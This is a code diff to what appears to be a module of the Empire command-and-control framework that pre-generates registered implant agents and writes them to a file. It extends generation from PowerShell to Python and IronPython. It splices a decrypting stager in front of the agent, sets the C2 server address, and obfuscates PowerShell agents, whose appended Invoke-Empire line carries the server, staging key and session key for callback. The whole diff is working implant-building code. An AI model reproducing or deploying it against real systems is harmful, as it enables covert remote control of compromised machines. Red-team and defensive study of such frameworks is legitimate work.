@@ -18,9 +18,14 @@ class Module(object):
     def generate(main_menu, module: PydanticModule, params: Dict, Listener: str = "", Language: str = "", OutFile: str = ""):
 
         listener_name = params['Listener']
-        language = params['Language']
         out_file = params['OutFile']
-    
+        if params['Language'] == 'ironpython':
+            language = 'python'
+            version = 'ironpython'
+        else:
+            language = params['Language']
+            version = ''
+
         if listener_name not in main_menu.listeners.activeListeners:
             return handle_error_message("[!] Error: %s not an active listener")
     
@@ -49,18 +54,19 @@ class Module(object):
         session_key = main_menu.agents.get_agent_session_key_db(session_id)
     
         agent_code = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_agent(
-            active_listener['options'], language=language)
+            active_listener['options'], language=language, version=version)
     
         if language.lower() == 'powershell':
             agent_code += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (
                 host, staging_key, session_key, session_id)
-        else:
-            return handle_error_message('[!] Only PowerShell agent generation is supported at this time.')
-    
             # Get the random function name generated at install and patch the stager with the proper function name
-        agent_code = data_util.keyword_obfuscation(agent_code)
+            code = data_util.keyword_obfuscation(agent_code)
+        else:
+            stager_code = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_stager(
+                active_listener['options'], language=language, encrypt=False)
+            stager_code = stager_code.replace('exec(agent)', '')
+            code = f"server='{host}';\n" + stager_code + f"\n{agent_code}"
 
-        # TODO: python agent generation - need to patch in crypto functions from the stager...
         print(helpers.color("[+] Pre-generated agent '%s' now registered." % session_id))
 
         # increment the supplied file name appropriately if it already exists
@@ -82,11 +88,11 @@ class Module(object):
             i += 1
     
         f = open(out_file, 'w')
-        f.write(agent_code)
+        f.write(code)
         f.close()
     
         print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (
             language, listener_name, session_id, out_file)))
         print(helpers.color("[*] Run sysinfo command after agent starts checking in!"))
 
-        return agent_code
+        return code
